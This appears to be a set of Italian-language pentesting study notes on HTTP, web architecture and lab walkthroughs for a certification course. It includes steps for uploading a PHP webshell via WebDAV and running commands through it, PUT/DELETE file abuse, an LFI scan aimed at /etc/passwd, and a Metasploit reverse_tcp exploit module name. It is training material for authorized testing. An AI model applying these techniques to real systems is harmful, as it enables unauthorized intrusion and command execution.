# Web Application Penetration Testing: Introduction to the Web & HTTP Protocol

## Introduction to Web Application Security

### Introduction

#### Web Applications

* Applicazioni che girano su **web server**
* Accessibili tramite **browser**
* Comunicazione basata su **HTTP / HTTPS**
* Spesso gestiscono **dati sensibili** (credenziali, dati personali, finanziari)
* Rappresentano una **superficie di attacco esposta pubblicamente**

#### Come Funzionano le Web Application

* Architettura **client–server**
  * Client (browser) → invia richieste HTTP
  * Server → elabora e restituisce risposte
* UI basata su **HTML, CSS, JavaScript**
* Tutti gli input lato client sono **controllabili e manipolabili**
* I controlli di sicurezza devono essere **lato server**

#### HTTP – Concetti Rilevanti per il Pentest

* Protocollo **stateless**
* Lo stato utente è gestito tramite:
  * sessioni
  * cookie
  * token
* Errori nella gestione dello stato portano spesso a:
  * authentication bypass
  * session hijacking
  * IDOR

#### Web Application Security

* Obiettivo: garantire
  * **Confidentiality**
  * **Integrity**
  * **Availability**
* Le web application sono target frequenti perché:
  * sono pubblicamente accessibili
  * un singolo bug può avere impatto su molti utenti
  * consentono accesso diretto ai dati

#### Perché è Importante nel Pentesting

* Molte vulnerabilità derivano da:
  * input validation insufficiente
  * controlli di autorizzazione mancanti
  * gestione debole delle sessioni
  * configurazioni errate
  * software o componenti non patchati
* Ogni misura difensiva è anche un **punto di test offensivo**

#### Aree Chiave da Testare durante un Pentest Web

* Autenticazione e autorizzazione
* Gestione sessioni e cookie
* Validazione degli input (SQLi, XSS, ecc.)
* Comunicazione sicura (HTTPS/TLS)
* Controlli di accesso lato server
* Presenza e comportamento di WAF
* Configurazioni e componenti esposti

### Web Application Security Testing

#### Cos’è il Web Application Security Testing

* Processo di **valutazione della sicurezza** delle web application
* Obiettivo: identificare
  * vulnerabilità
  * debolezze
  * rischi di sicurezza
* Mira a verificare la **resilienza dell’applicazione** contro attacchi e accessi non autorizzati
* Finalizzato a individuare i problemi **prima che vengano sfruttati**
* Riduce il rischio di:
  * data breach
  * accessi non autorizzati
  * esposizione di informazioni sensibili

#### Tipologie di Web Application Security Testing

* **Vulnerability Scanning**
  * Uso di tool automatici
  * Ricerca di vulnerabilità note (SQLi, XSS, misconfigurazioni, software obsoleto)
* **Penetration Testing**
  * Simulazione di attacchi reali
  * Valutazione delle difese applicative
  * Identificazione di vulnerabilità sfruttabili
* **Code Review / Static Analysis**
  * Analisi del codice sorgente
  * Identificazione di bug logici, errori di coding e misconfigurazioni
* **Authentication & Authorization Testing**
  * Verifica dei meccanismi di login
  * Controllo dei livelli di accesso e dei permessi
* **Input Validation & Output Encoding Testing**
  * Analisi di come vengono gestiti gli input utente
  * Prevenzione di XSS, SQL Injection e vulnerabilità simili
* **Session Management Testing**
  * Analisi della gestione di sessioni e token
  * Prevenzione di attacchi legati alla sessione
* **API Security Testing**
  * Valutazione della sicurezza delle API usate dall’applicazione
  * Test di endpoint, autenticazione e autorizzazione

#### Web Application Penetration Testing

* Sottoinsieme del web application security testing
* Focalizzato sul **tentativo di exploit delle vulnerabilità**
* Simulazione di un attacco reale condotto da:
  * pentester
  * ethical hacker
  * bug bounty hunter
* Approccio:
  * sistematico
  * controllato
  * autorizzato
* Obiettivo: **validare l’impatto reale** delle vulnerabilità identificate

#### Web App Pentesting vs Web App Security Testing

| **Aspect**           | **Web App Security Testing**                                        | **Web App Pentesting**                                                         |
| -------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **Objective**        | Identificare vulnerabilità e debolezze senza sfruttarle attivamente | Tentare lo sfruttamento delle vulnerabilità per valutarne l’impatto reale      |
| **Focus**            | Approccio più ampio, include test manuali e automatizzati           | Focalizzato sull’identificazione e sfruttamento delle vulnerabilità            |
| **Methodology**      | Diverse tipologie di assessment (SAST, DAST, IAST, SCA, ecc.)       | Testing prevalentemente manuale con tool di supporto                           |
| **Exploitation**     | Non prevede lo sfruttamento delle vulnerabilità                     | Prevede exploit controllati e autorizzati                                      |
| **Impact**           | Non intrusivo, orientato all’identificazione dei problemi           | Può essere intrusivo e causare impatti sull’applicazione                       |
| **Reporting**        | Elenco vulnerabilità con raccomandazioni di remediation             | Vulnerabilità sfruttate, impatto reale e misure correttive                     |
| **Testing Approach** | Può includere automazione e scansioni                               | Principalmente manuale                                                         |
| **Goal**             | Migliorare la postura di sicurezza dell’applicazione                | Validare l’efficacia dei controlli di sicurezza e della risposta agli attacchi |

### Common Web Application Threats & Risks

#### Contesto Generale

* Le web application sono **costantemente esposte a minacce** a causa di:
  * ampia accessibilità
  * dati di valore che processano
* Comprendere le minacce comuni è essenziale per valutare il rischio reale e implementare contromisure efficaci
* **Impatto e severità** di una minaccia dipendono da:
  * tipo di applicazione
  * vulnerabilità presenti
  * misure di sicurezza adottate
* La sicurezza web richiede un approccio proattivo, multilivello, continuo

#### Threat vs Risk (concetti chiave per il pentest)

**Threat**

* Potenziale **sorgente di danno**
* Può sfruttare una vulnerabilità
* Può essere:
  * umana (attacker, insider)
  * tecnica (malware, DoS)
* In cybersecurity include:
  * malware
  * phishing
  * DoS/DDoS
  * data breach

**Risk**

* Possibilità che una threat **abbia successo**
* Dipende da:
  * probabilità di sfruttamento
  * impatto dell’evento
* Una threat può esistere senza costituire un rischio elevato se:
  * la vulnerabilità non è presente
  * i controlli di sicurezza sono efficaci

**In sintesi**

* _Threat_ = pericolo potenziale
* _Risk_ = probabilità + impatto del pericolo

#### Common Web Application Threats & Risks

| **Threat / Risk**                               | **Description**                                                                                  |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **Cross-Site Scripting (XSS)**                  | Iniezione di script malevoli eseguiti nel browser di altri utenti, con furto di sessioni e dati. |
| **SQL Injection (SQLi)**                        | Manipolazione degli input per eseguire query SQL arbitrarie, con accesso o modifica dei dati.    |
| **Cross-Site Request Forgery (CSRF)**           | Induzione di utenti autenticati a eseguire azioni non volute sfruttando sessioni attive.         |
| **Security Misconfigurations**                  | Configurazioni errate di server, framework o database che espongono il sistema.                  |
| **Sensitive Data Exposure**                     | Protezione insufficiente di password, dati personali o finanziari.                               |
| **Brute Force / Credential Stuffing**           | Tentativi automatizzati per indovinare credenziali valide.                                       |
| **File Upload Vulnerabilities**                 | Upload non sicuro che consente l’esecuzione di file malevoli o accesso al server.                |
| **DoS / DDoS**                                  | Saturazione delle risorse per rendere il servizio indisponibile.                                 |
| **Server-Side Request Forgery (SSRF)**          | Induzione del server a effettuare richieste verso risorse interne o esterne.                     |
| **Inadequate Access Controls**                  | Controlli di accesso deboli che permettono accessi non autorizzati.                              |
| **Using Components with Known Vulnerabilities** | Uso di dipendenze vulnerabili che introducono falle note.                                        |
| **Broken Access Control**                       | Mancata restrizione dell’accesso a funzionalità o dati riservati.                                |

#### Considerazioni Finali (ottica pentester)

* Le minacce elencate rappresentano **solo una parte** dei rischi reali
* Dal punto di vista del pentest è fondamentale:
  * riconoscere rapidamente le minacce comuni
  * mappare le vulnerabilità sfruttabili
  * valutare **impatto reale e probabilità**
* La conoscenza delle minacce guida:
  * la fase di recon
  * l’analisi dell’attack surface
  * la prioritizzazione dei test

## Web Application Architecture & Components

### Web Application Architecture

#### Perché interessa al Pentester

* L’architettura determina:
  * **attack surface**
  * **trust boundaries**
  * **dove avviene la validazione**
* Capire _dove_ gira il codice e _chi_ gestisce i dati è fondamentale per:
  * individuare vulnerabilità logiche
  * sfruttare misconfigurazioni
  * bypassare controlli di sicurezza

#### Client–Server Model (solo ciò che conta)

* **Client**
  * Tutto ciò che gira nel browser è **non fidato**
  * JavaScript, controlli UI e validazioni possono essere:
    * modificati
    * bypassati
    * totalmente rimossi
* **Server**
  * Unico punto dove:
    * devono avvenire i controlli di sicurezza reali
    * risiedono business logic e autorizzazioni
  * Errori lato server = **impatto reale**

> Regola chiave per il pentest:\
> **Mai fidarsi di nulla che viene dal client**

#### Web Application Components (vista offensiva)

| **Component**          | **Pentest Focus**                             |
| ---------------------- | --------------------------------------------- |
| **UI / Frontend**      | Parametri, input nascosti, logica client-side |
| **Client-Side Code**   | JS reverse, controlli aggirabili, API calls   |
| **Server-Side Code**   | AuthZ, validazioni, business logic flaws      |
| **Application Logic**  | IDOR, logic bugs, privilege escalation        |
| **Databases**          | SQLi, data exposure                           |
| **Web Server**         | Misconfigurazioni, file statici, headers      |
| **Application Server** | RCE, deserializzazione, template injection    |

#### Client-Side Processing (pentest view)

* Utile solo per:
  * mappare logica applicativa
  * individuare parametri e API
* **Non sicuro per default**
* Qualsiasi controllo lato client:
  * può essere bypassato via proxy
  * non va considerato una protezione

**Implicazioni pratiche**

* Client-side validation ≠ server-side validation
* Presenza di controlli nel JS → ottimo punto di partenza per test

#### Server-Side Processing (core del pentest)

* Dove avviene:
  * gestione delle sessioni
  * autorizzazione
  * accesso ai dati
* Target principale per:
  * SQLi
  * auth bypass
  * logic flaws
  * RCE / SSRF

**Errore comune**

* Confondere autenticazione con autorizzazione\
  → causa frequente di **Broken Access Control**

#### Communication & Data Flow (attack surface)

* Tutta la comunicazione avviene via **HTTP/HTTPS**
* Ogni request è:
  * intercettabile
  * modificabile
  * replicabile

**Per il pentest**

* Ogni endpoint è un potenziale vettore
* Ogni parametro (URL, body, header, cookie) è:
  * controllabile
  * testabile
* Importante capire:
  * flusso dati
  * dove i dati vengono trasformati
  * dove vengono validati (o non validati)

#### Takeaway Pentest-Oriented

* L’architettura guida:
  * la fase di recon
  * la mappatura degli endpoint
  * la priorità dei test
* La maggior parte delle vulnerabilità nasce da:
  * fiducia eccessiva nel client
  * confini poco chiari tra componenti
  * business logic non protetta

### Web Application Technologies

Nel web application pentesting è fondamentale capire **quali tecnologie compongono l’applicazione**, perché da queste dipendono **attack surface**, **tipologia di vulnerabilità** e **tecniche di exploit** applicabili.

#### Client-Side

Tutto ciò che gira nel browser (**HTML, CSS, JavaScript**) è **non affidabile**.\
Dal punto di vista del pentest, il client-side serve principalmente per:

* mappare endpoint, parametri e API
* comprendere flussi applicativi e logica esposta
* individuare controlli aggirabili (validazioni, ruoli, limiti)

Cookie e local storage sono spesso usati per **sessioni e token**, e rappresentano un punto critico per session hijacking, token leakage e DOM‑based vulnerabilities.

#### Server-Side

Il backend è dove avvengono i **controlli reali di sicurezza** e dove si concentra l’impatto delle vulnerabilità.

Web server, application server, linguaggi server‑side e database gestiscono:

* autenticazione e autorizzazione
* business logic
* accesso e modifica dei dati

Errori o fiducia eccessiva nei dati ricevuti dal client portano a vulnerabilità come **SQLi, IDOR, logic flaws, deserialization e RCE**.

#### Comunicazione e Flusso dei Dati

La comunicazione avviene interamente tramite **HTTP/HTTPS**.\
Ogni request può essere intercettata, modificata e replicata, inclusi:

* URL e parametri
* body
* header
* cookie

Per il pentest, ogni endpoint e ogni parametro è **potenzialmente un input malevolo**.

#### API e Data Interchange

Le web application moderne espongono spesso **API REST** che:

* contengono più funzionalità del frontend
* hanno controlli di accesso deboli o mancanti

I formati dati più comuni (JSON, XML) introducono vulnerabilità specifiche:

* JSON → mass assignment, trust eccessivo
* XML → XXE, parsing issues

#### Tecnologie di Sicurezza ed Estensioni

Meccanismi come autenticazione, autorizzazione e TLS:

* **non eliminano** vulnerabilità logiche
* proteggono solo specifici aspetti (identità, trasporto)

CDN, framework e librerie di terze parti:

* ampliano l’attack surface
* introducono rischio di **misconfigurazioni** e **dipendenze vulnerabili**

#### Concetto chiave per il Pentest

La tecnologia **non è neutra**:\
determina **come attaccare l’applicazione** e **quali vulnerabilità aspettarsi**.\
Più componenti → più superficie di attacco.

<figure><img src="../.gitbook/assets/image (1898).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1897).png" alt=""><figcaption></figcaption></figure>

## HTTP Protocol

### Introduction to HTTP

* HTTP è un protocollo **stateless** di livello applicativo per la comunicazione **client–server**
* Browser → **HTTP request**, server → **HTTP response**
* Le risorse sono identificate da **URL/URI**
* HTTP gira su **TCP**; HTTPS è HTTP sopra **TLS** (protegge il trasporto, non la logica)

Un messaggio HTTP è composto da:

* **Headers**
* una linea vuota (`\r\n`)
* **Body** (opzionale)

Tutto ciò che viaggia in una request HTTP può essere **intercettato e modificato**:\
è qui che nasce gran parte delle vulnerabilità web.

HTTP/1.1 è la versione più comune e consente:

* riuso della connessione
* richieste multiple sulla stessa connessione

### HTTP Requests

Una **HTTP request** è il messaggio inviato dal client al server per richiedere una risorsa o eseguire un’azione.\
Dal punto di vista del pentest, **tutto ciò che compone una request è controllabile**.

#### Struttura di una HTTP Request

Una request è formata da:

* **Request Line**
* **Headers**
* **Body** (opzionale)

#### Request Line

Contiene tre elementi fondamentali:

* **HTTP Method** (GET, POST, PUT, DELETE, ecc.)
* **URL / Path** della risorsa richiesta
* **Versione del protocollo** (es. HTTP/1.1)

È il punto in cui si definisce **cosa** si sta chiedendo e **come**.

#### Request Headers

Gli header forniscono informazioni aggiuntive al server e influenzano il comportamento dell’applicazione.

Header comuni e rilevanti:

* **Host**: sito richiesto (base per virtual hosting)
* **User-Agent**: identifica client e ambiente
* **Accept**: tipo di contenuto atteso
* **Accept-Encoding**: encoding accettato (gzip, deflate)
* **Authorization**: credenziali / token
* **Cookie**: sessioni e stato utente
* **Connection**: gestione della connessione (keep-alive)

Molte vulnerabilità derivano da **fiducia eccessiva negli header**.

#### Request Body (opzionale)

Presente tipicamente con:

* POST
* PUT
* PATCH

Contiene i dati inviati al server (form data, JSON, XML).\
È uno dei **principali vettori di input per injection e logic flaws**.

#### HTTP Request Methods (pentest view)

| Method  | Nota per il Pentest                                        |
| ------- | ---------------------------------------------------------- |
| GET     | Recupero dati, spesso usato per enumeration e IDOR         |
| POST    | Azioni che cambiano stato, target principale per injection |
| PUT     | Creazione/aggiornamento risorse, spesso mal protetto       |
| DELETE  | Impatto elevato se non correttamente autorizzato           |
| PATCH   | Modifica parziale, spesso trascurato nei controlli         |
| HEAD    | Utile per info disclosure                                  |
| OPTIONS | Enumeration dei metodi supportati                          |

#### Concetti Chiave per il Pentest

* **Host + Path = URL finale**
* Ogni header e parametro può essere:
  * modificato
  * rimosso
  * duplicato
* I controlli devono essere **lato server**
* Il browser non è una misura di sicurezza

### HTTP Response

Una **HTTP response** è il messaggio inviato dal server al client in risposta a una HTTP request.\
Dal punto di vista del pentest, la response rivela **comportamento applicativo, controlli lato server e possibili leak**.

#### Struttura di una HTTP Response

Una response è composta da:

* **Status Line**
* **Response Headers**
* **Response Body**

#### Status Line

È la prima riga della response e contiene:

* **Versione HTTP** (es. HTTP/1.1)
* **Status Code** (es. 200, 401, 403)
* **Messaggio testuale** (OK, Forbidden, ecc.)

Lo **status code** è spesso il primo indicatore di:

* auth bypass
* access control issues
* input validation problems

#### Response Headers

I response headers descrivono **come interpretare il contenuto** e **come il server gestisce la risposta**.

Header comuni e rilevanti:

* **Content-Type**: tipo di contenuto restituito
* **Content-Length**: dimensione del body
* **Content-Encoding**: encoding/compressione applicata
* **Set-Cookie**: impostazione di cookie e sessioni
* **Cache-Control**: regole di caching
* **Server**: banner del web server
* **Date**: timestamp della generazione della response

Molti problemi di sicurezza derivano da:

* header mancanti
* header troppo permissivi
* informazioni esposte inutilmente

#### Response Body

Contiene il contenuto effettivo restituito dal server:

* HTML
* JSON
* XML
* file

È il punto dove si manifestano:

* XSS
* data leakage
* error disclosure
* logic flaws

#### Common HTTP Status Codes (pentest view)

| Code | Significato operativo     |
| ---- | ------------------------- |
| 200  | Richiesta riuscita        |
| 301  | Redirect permanente       |
| 302  | Redirect temporaneo       |
| 400  | Richiesta malformata      |
| 401  | Autenticazione richiesta  |
| 403  | Accesso negato            |
| 404  | Risorsa inesistente       |
| 500  | Errore interno del server |

Le **differenze di status code** tra richieste simili sono spesso indicatori di vulnerabilità.

#### Cache-Control

| Directive | Nota pentest                                |
| --------- | ------------------------------------------- |
| public    | Contenuti condivisibili (rischio data leak) |
| private   | Risposta per singolo utente                 |
| no-cache  | Richiede revalidazione                      |
| no-store  | Nessuna cache                               |
| max-age   | Durata della cache                          |

Configurazioni errate di cache possono portare a **leak di dati di altri utenti**.

#### Concept chiave per il Pentest

* Le response mostrano **come il server ragiona**
* Status code, header e body vanno sempre confrontati
* Piccole differenze = grande superficie di attacco

### HTTP Basics Lab – Procedura Completa

#### 1. Stabilimento della Connessione TCP

La prima fase osservabile è lo **stabilimento della connessione TCP**, che avviene tramite il **3‑way handshake**:

1. **SYN** → il client richiede l’apertura della connessione
2. **SYN/ACK** → il server conferma e risponde
3. **ACK** → il client conferma definitivamente

Solo dopo questa fase può avvenire la comunicazione HTTP.

In **Wireshark** è possibile osservare chiaramente:

* i pacchetti SYN / SYN‑ACK / ACK
* le porte coinvolte:
  * **porta server** (es. 80)
  * **porta client** casuale (ephemeral port)

La porta client può essere verificata anche dal sistema con:

```
netstat -antp
```

#### 2. Analisi della HTTP GET Request

Dopo il handshake TCP, il client invia una **HTTP GET request** del tipo:

```
GET / HTTP/1.1
```

In **Wireshark**:

* sono visibili **tutti i livelli dello stack ISO/OSI**
* espandendo il livello **HTTP**, si può analizzare:
  * metodo
  * path richiesto
  * header HTTP

Questa richiesta rappresenta la richiesta della **pagina principale** del sito.

#### 3. Analisi della HTTP Response

Il server risponde con una **HTTP response** che contiene:

* codice di stato HTTP (es. `200 OK`)
* headers HTTP
* **body della response**, che include:
  * codice HTML
  * eventuale JavaScript
  * riferimenti a fogli di stile CSS

Se l’HTML fa riferimento a risorse esterne (CSS / JS), il browser:

* invia **ulteriori HTTP request**
* una per ogni risorsa

Queste richieste aggiuntive sono visibili in Wireshark come flussi separati.

#### 4. Seguire il Flusso TCP in Wireshark

Per analizzare comodamente una conversazione completa:

1. Tasto destro su un pacchetto TCP (es. handshake)
2. **Follow → TCP Stream**

Questo consente di:

* visualizzare richiesta e risposta HTTP complete
* osservare sequenze e contenuti in ordine logico

#### 5. Compressione dei Contenuti (gzip)

Durante il lab si osserva che:

* alcuni file (es. CSS) vengono restituiti compressi
* la compressione è indicata dall’header:

```
Content-Encoding: gzip
```

Questo è importante perché:

* influisce su come il client interpreta il contenuto
* può impattare analisi e manipolazioni manuali

#### 6. Esportazione dei File da Wireshark

È possibile estrarre direttamente i file ricevuti:

1. **Wireshark → File**
2. **Export Objects → HTTP**
3. Selezionare i file:
   * pagine HTML
   * CSS
   * JavaScript

In questo modo è possibile:

* analizzare localmente i file
* studiare JS e logica client‑side offline

#### 7. Directory Bruteforce

Durante il directory bruteforcing si osserva che:

* le risposte **HTTP 200** indicano pagine valide
* sono correttamente renderizzate nel browser

Viene individuata la directory:

```
/uploads
```

#### 8. Analisi della Directory `/uploads`

Apertura diretta della directory `/uploads` per verificarne:

* contenuto accessibile
* configurazione del web server

#### 9. Enumerazione dei Metodi HTTP Supportati

Per verificare i metodi permessi sulla directory `/uploads`:

1. Inviare una richiesta al **Repeater di Burp Suite**
2. Modificare la request in:

```
OPTIONS /uploads/ HTTP/1.1
```

La response indica, tramite header `Allow`, i metodi supportati, ad esempio:

* DELETE
* COPY
* POST

Non è presente **PUT**, ma è presente l’header:

```
DAV
```

Questo suggerisce che **WebDAV è abilitato**.

#### 10. Abuso di WebDAV – Upload File Malevolo

La presenza di WebDAV consente:

* upload
* navigazione directory

Viene caricato un file **webshell PHP** usando `curl`.

Dopo l’upload:

* ricaricando la pagina `/uploads`
* il file PHP risulta presente
* cliccandoci sopra viene visualizzato il suo funzionamento

#### 11. Esecuzione di Comandi via Webshell

La webshell accetta comandi tramite parametro URL, ad esempio:

```
?cmd=
```

Gli spazi devono essere:

* codificati (`+` o URL encoding)

Per semplificare:

* inviare la request al **Repeater di Burp**
* inserire il comando nel parametro
* Burp gestisce automaticamente l’URL encoding

In caso di errori:

* sostituire manualmente lo spazio con `+`

#### 12. Cancellazione di una Risorsa con DELETE

Per rimuovere la webshell:

1. Inviare la request al Repeater
2. Modificare il metodo in:

```
DELETE /uploads/simple-backdoor.php HTTP/1.1
```

La risposta è:

```
204 No Content
```

Verifica:

* ricaricando `/uploads/simple-backdoor.php`
* la risposta è `404 Not Found`
* il file è stato correttamente eliminato

### HTTP Method Enumeration (Lab)

L'enumerazione dei metodi HTTP permette di identificare quali azioni (GET, POST, PUT, DELETE, ecc.) sono permesse dal server su specifiche pagine o directory.

#### Enumerazione Metodi su `login.php`

A differenza della home page, la pagina di login accetta il metodo POST per l'invio delle credenziali.

```shellscript
# Invio credenziali via POST con CURL
curl -X POST demo.ine.local/login.php -d "name=john&password=password" -v
```

* Risultato: Una risposta 302 Redirect indica solitamente che le credenziali sono corrette e il server sta reindirizzando l'utente alla dashboard (`index.php`).

#### Interazione con `post.php` e OPTIONS

Il metodo OPTIONS viene utilizzato per elencare i metodi supportati da una risorsa specifica.

<pre class="language-shellscript"><code class="lang-shellscript">curl -X OPTIONS demo.ine.local/login.php -v
<strong># Controllo metodi supportati
</strong>curl -X OPTIONS demo.ine.local/post.php -v
</code></pre>

* Metodi abilitati: GET, POST, HEAD, OPTIONS.

#### Sfruttamento WebDAV nella directory `/uploads`

Se il modulo WebDAV è attivo, il server potrebbe permettere l'upload di file arbitrari tramite il metodo PUT.

1.  Verifica permessi directory:

    ```bash
    curl -X OPTIONS demo.ine.local/uploads/ -v
    ```

    _Se tra i metodi consentiti appare PUT, la directory è vulnerabile._
2.  Upload di un file (Metodo PUT):

    ```bash
    echo "Hello World" > hello.txt
    curl demo.ine.local/uploads/ --upload-file hello.txt
    ```
3. Verifica: Naviga su `http://demo.ine.local/uploads/hello.txt` per confermare il caricamento.

#### Eliminazione file (Metodo DELETE)

Se il metodo PUT è attivo, spesso lo è anche il metodo DELETE, permettendo di rimuovere file dal server.

```bash
# Eliminazione del file precedentemente caricato
curl -X DELETE demo.ine.local/uploads/hello.txt
```

#### Comandi Rapidi CURL per Enumerazione

| **Switch**      | **Funzione**                                                                                      |
| --------------- | ------------------------------------------------------------------------------------------------- |
| `-X [METHOD]`   | Specifica il metodo HTTP (POST, OPTIONS, DELETE, ecc.).                                           |
| `-d "[DATA]"`   | Invia i dati (es. username e password) nel corpo della richiesta.                                 |
| `-v` (Verbose)  | Mostra gli header della richiesta e della risposta (fondamentale per vedere i metodi consentiti). |
| `--upload-file` | Utilizza il metodo PUT per caricare un file locale sul server.                                    |
| `-I`            | Invio di una richiesta tramite metodo HEAD                                                        |

{% hint style="info" %}
Consiglio per l'eJPT: Se trovi una directory `/uploads` o `/webdav` durante la scansione iniziale, controlla immediatamente i metodi con `OPTIONS`. Riuscire a caricare un file (PUT) significa poter caricare una Webshell e ottenere RCE immediato.
{% endhint %}

### HTTPS & SSL/TLS: I Fondamenti

L'HTTPS (Hypertext Transfer Protocol Secure) è la versione protetta dell'HTTP, progettata per garantire la sicurezza delle comunicazioni tra browser e web server.

#### Architettura e Meccanismi

* Layering: Funziona eseguendo il protocollo HTTP sopra un livello di cifratura SSL (Secure Sockets Layer) o TLS (Transport Layer Security).
* Obiettivi: Fornisce tre protezioni fondamentali: Riservatezza (i dati non sono leggibili), Integrità (i dati non sono alterabili) e Autenticazione (conferma l'identità delle parti).
* Trasmissione: A differenza dell'HTTP standard che invia dati in chiaro, l'HTTPS cifra tutto il traffico utilizzando algoritmi crittografici forti.

#### Vantaggi e Limiti per il Pentesting

* Eavesdropping: L'HTTPS impedisce ad attaccanti non autorizzati di "origliare" o intercettare dati sensibili come password o numeri di carte di credito durante il transito.
* Falle Applicative: Importante: L'HTTPS non protegge contro le vulnerabilità del codice web. Attacchi come XSS (Cross-Site Scripting) e SQL Injection funzionano normalmente anche su siti cifrati.
* Scope: La cifratura protegge solo il "tunnel" di comunicazione, non l'applicazione stessa.

#### 💡 Integrazioni e Consigli per il Pentesting (Extra)

* Identificazione rapida: Se durante una scansione trovi la porta 443, usa `sslscan` o `nmap --script ssl-enum-ciphers` per vedere se il server supporta protocolli obsoleti (come SSLv3 o TLS 1.0) che sono vulnerabili ad attacchi come POODLE o BEAST.
* Analisi dei Certificati: Controlla sempre i dettagli del certificato SSL. Spesso contengono nomi di dominio alternativi (SAN) che possono rivelare sottodomini di sviluppo o test non elencati altrove.
* HFS Exploit: Quando trovi Rejetto HFS 2.3, il modulo Metasploit da cercare è `exploit/windows/http/rejetto_hfs_exec`. Ricorda che spesso richiede un payload `reverse_tcp` per bypassare eventuali firewall in uscita.
* HTTPS vs Web App: Come dicono i tuoi appunti, l'HTTPS è solo il "tunnel". Una volta dentro il tunnel, se l'app è scritta male, puoi comunque iniettare codice SQL o script malevoli.

### Passive Crawling & Spidering with Burp Suite & OWASP ZAP

Questa fase serve a mappare l'intera struttura di una web application per scoprire risorse, file o directory non visibili a occhio nudo.

#### Crawling (Ricognizione Passiva)

Il crawling è il processo di navigazione di un'app seguendo link, compilando form e loggando dove possibile.

* Obiettivo: Catalogare i percorsi di navigazione e capire come è strutturato il sito.
* Metodo Passivo: Si effettua navigando manualmente il sito mentre un proxy (come Burp Suite) registra il traffico.
* Burp Suite: È possibile attivare un Live Passive Crawler dalla Dashboard (New Live Task) per mappare l'app in tempo reale durante la navigazione.

#### Spidering (Ricognizione Attiva)

Lo spidering è un processo automatico che scopre nuovi URL partendo da una lista di "semi" (seed) e visitando ricorsivamente tutti i link trovati.

* Caratteristica: È una tecnica "Loud" (rumorosa) perché genera molte richieste HTTP, rendendola facilmente rilevabile.
* Tool (OWASP ZAP): Si avvia cliccando con il tasto destro sul sito nel pannello _Sites_ -> `Attack` -> `Spider`.
* Parametri: È possibile impostare la profondità massima (depth) della scansione per limitare quanto "lontano" lo spider deve spingersi.
* Analisi Visiva: In ZAP, i link verdi sono interni, quelli rossi portano a risorse esterne.

#### Reperti Critici e Analisi dei Risultati

Lo spidering spesso rivela file e cartelle che non dovrebbero essere accessibili pubblicamente:

* File di Configurazione: Esempio `config.inc`, che può contenere parametri di connessione o dati sensibili.
* Directory Sensibili: Cartelle come `/passwords/` o `/phpmyadmin/` (che rivela anche l'uso del linguaggio PHP).
* Credenziali: File di testo che elencano account e password in chiaro.

#### 💡 Tips Operativi dal Laboratorio

* Punto di Arresto: Solitamente, quando lo spider di ZAP arriva al 70%, ha già mappato la maggior parte delle risorse utili.
* Verifica Diretta: Ogni file interessante trovato nel Site Map può essere aperto direttamente nel browser con un click destro per verificarne il contenuto.
* Configurazione Proxy: Assicurati che FoxyProxy sia impostato su Burp Suite (o ZAP) durante la navigazione per non perdere nessuna richiesta.

### Passive Crawling with Burp Suite (Lab)

#### Fase 1: Verifica e Ricognizione Iniziale

1. **Accesso**: Apri il link del laboratorio per accedere alla macchina Kali Linux.
2. **Test Connettività**: Verifica che il target sia raggiungibile con il comando: `ping -c 4 demo.ine.local`
3. **Scansione Porte**: Esegui Nmap per identificare i servizi attivi: `nmap -sS -sV demo.ine.local`
   * _Risultato atteso_: Le porte 80 (HTTP) e 3306 (MySQL) devono risultare aperte.

#### Fase 2: Configurazione Proxy e Navigazione

4. **Apertura Browser**: Avvia Firefox e naviga all'indirizzo del target: `firefox http://demo.ine.local`
   * L'applicazione target è OWASP Mutillidae II.
5. **Configurazione Proxy**: Imposta Firefox per utilizzare il proxy di Burp Suite (solitamente tramite FoxyProxy).
6. **Avvio Burp Suite**:
   * Vai alla scheda Proxy.
   * Assicurati che Intercept sia impostato su OFF.

#### Fase 3: Esecuzione del Passive Crawling

7. **Verifica Dashboard**: Vai nella scheda Dashboard.
   * Noterai che il Passive Crawling è abilitato di default.
8. **Navigazione**: Esplora manualmente l'applicazione Mutillidae cliccando sui vari link. Burp effettuerà automaticamente il crawling delle pagine visitate.
   * Puoi monitorare le statistiche del crawler passivo direttamente nella Dashboard.
9. **Analisi Traffico**: Vai nella scheda Proxy -> HTTP history per vedere l'elenco cronologico di tutte le pagine visitate.

#### Fase 4: Analisi dei Risultati

10. **Mappa del Sito**: Spostati nella scheda Target.
    * Qui verrà visualizzata la Sitemap completa dell'applicazione web, organizzata gerarchicamente.

## Web App Security Testing

### Web Server Scanning with Nikto

Nikto è un vulnerabilty scanner focalizzato specificamente sul web server (es. Apache, Nginx) piuttosto che sulla logica della web application stessa. È utile per identificare configurazioni errate e vulnerabilità come la Local File Inclusion (LFI).

#### Scansione di Base

Per avviare una scansione standard contro un target: `nikto -h <IP_o_HOSTNAME>`

Informazioni identificate da Nikto:

* Target: Hostname, IP e porta.
* Software: Versione del Webserver (es. Apache 2.4.7) e Sistema Operativo (es. Ubuntu).
* Backend: Tecnologie server-side tramite header `X-Powered-By` (es. PHP).
* Security Headers: Assenza di flag `httponly` nei cookies.
* File Sensibili: Analisi del file `robots.txt` ed enumerazione delle entries.
* Directory: Identificazione di cartelle come `/config/` (con verifica del _directory listing_) o `/phpmyadmin/`.
* Database: Dalla presenza di phpmyadmin e PHP su Linux, si può dedurre l'uso di MySQL/MariaDB.

#### Vulnerabilità: Local File Inclusion (LFI)

L'LFI permette a un attaccante di leggere file locali sul server che non dovrebbero essere accessibili.

Comando per cercare LFI con Nikto: `nikto -h http://<TARGET>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm`

* -Tuning 5: Focalizza la scansione sui file inclusi/File Traversal.
* -o nikto.html -Format htm: Salva il report in formato leggibile da browser.

#### Analisi del Report

Analizzando il file `nikto.html` generato, è possibile trovare vulnerabilità specifiche (es. _PHP Nuke Rocket add-in_ vulnerabile a File Traversal).

* Verifica: Nikto fornisce spesso un link diretto nel report per testare la vulnerabilità.
* Payload: Tramite File Traversal è possibile tentare la lettura di file critici di sistema come `/etc/passwd`.

#### 💡 Tips Operativi (Nikto)

* Cookies: Nikto enumera automaticamente i cookie di sessione come `PHPSESSID`.
* Versioni: Una volta identificata la versione del webserver o di MySQL (es. 5.5.47), puoi cercare exploit specifici su siti come _Exploit-DB_.
* Help: Usa `nikto -Help` per visualizzare tutte le opzioni di tuning e i formati di output disponibili.

### Scanning Web Application with Nikto

